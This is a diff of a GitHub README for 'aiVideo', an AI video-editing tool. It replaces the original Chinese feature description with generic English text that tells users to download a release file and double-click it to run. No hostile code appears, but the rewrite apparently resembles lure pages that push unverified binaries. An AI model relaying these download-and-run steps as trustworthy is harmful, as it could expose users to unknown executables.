@@ -1,21 +1,84 @@
-# aiVideo
+# 🎥 aiVideo - Quick Video Editing Made Easy
 
-如果在做视频二创，这个工具可能会让你原本 3 小时的工作缩短到 3 分钟。⏱️
+## 🚀 Getting Started
 
-它把以下这套复杂的 Workflow 集成到了一个按钮里：
+Welcome to **aiVideo**! This tool helps you save time on video editing. Whether you are creating new content or editing existing videos, aiVideo simplifies the process.
 
-👁️ 视觉理解：AI 帮你把生肉视频“看”一遍。
+## 📥 Download & Install
 
-📝 文案生成：自动写出深度的解说/翻译文案。
+To begin, visit the Releases page to download the software:
 
-✂️ 智能操刀：（重点来了） 它会根据文案内容，自动去原始视频里把对应的画面剪出来！
+[![Download aiVideo](https://img.shields.io/badge/Download-aiVideo-brightgreen)](https://github.com/Johnny12242006/aiVideo/releases)
 
-🛠️ 完美对齐：通过独家算法，强制修复所有时间轴错误，输出完美的 SRT 字幕和配音视频。
+### Steps to Download aiVideo
 
-❌ 不需要你会写代码。 ❌ 不需要你一帧帧剪辑。 ❌ 不需要你为了字幕对不齐而发愁。
+1. Click the link above.
+2. Browse the available releases.
+3. Select the most recent version.
+4. Download the file for your operating system.
+5. Locate the downloaded file and double-click to run it.
 
-只要你会点上传，它就能帮你出片。这种“有脑子”的工具，真的很难不爱。😍
+## 🛠️ System Requirements
 
-<img width="1735" height="887" alt="image" src="https://github.com/user-attachments/assets/32aa8240-8e77-4e74-9dbe-6c364f9aecd8" />
-<img width="1432" height="920" alt="image" src="https://github.com/user-attachments/assets/75979688-925b-41db-8cc6-643cef14290c" />
+Before you start, ensure your system meets these requirements:
 
+- **Operating System:** Windows 10 or higher / macOS Mojave or higher
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 500 MB free space
+- **Internet Connection:** Required for downloading and activating features
+
+## 🎬 Features
+
+- **Visual Understanding:** The tool analyzes your video content.
+- **Automatic Script Generation:** It creates clear translations or commentary automatically.
+- **Smart Editing:** aiVideo cuts relevant scenes from the original video based on the generated script.
+- **Perfect Alignment:** The tool fixes any timing issues and outputs perfectly synchronized captions and dubbed video.
+
+## 🎉 How to Use aiVideo
+
+1. **Upload Your Video:**
+   - Open aiVideo and click on the upload button.
+   - Select the video file you want to edit.
+
+2. **Review Automatic Suggestions:**
+   - The tool will analyze your video and provide script suggestions.
+   - Review the auto-generated text to ensure it meets your needs.
+
+3. **Edit Video:**
+   - Choose scenes suggested by aiVideo based on the script.
+   - Make any edits here if needed.
+
+4. **Export Your Video:**
+   - Once you are satisfied with your edits, click on the export button.
+   - Choose your preferred file format and resolution.
+
+5. **Download Your Final Video:**
+   - aiVideo will process your video and prepare it for download.
+   - You will receive a notification once your video is ready. 
+
+## 🔍 Troubleshooting
+
+Should you encounter any issues:
+
+- **Installation Problems:** Ensure your operating system is supported and that you have enough storage space.
+- **Performance Issues:** Close any unnecessary applications to free up RAM.
+- **Video Upload Errors:** Confirm that your video format is compatible with aiVideo.
+
+## 🗣️ Support
+
+For additional help:
+
+- Visit our [GitHub Issues page](https://github.com/Johnny12242006/aiVideo/issues) to report any problems or ask questions.
+- Join our community forums for tips and user discussions.
+
+## 📢 Stay Updated
+
+Follow our repository to get the latest news and updates on new features and improvements:
+
+[![Star aiVideo](https://img.shields.io/github/stars/Johnny12242006/aiVideo)](https://github.com/Johnny12242006/aiVideo/stargazers)
+
+## 💬 Feedback
+
+We value your input! Please share your experience using aiVideo to help us improve. 
+
+Thank you for choosing aiVideo! We hope this tool helps you streamline your video editing process. Enjoy creating!
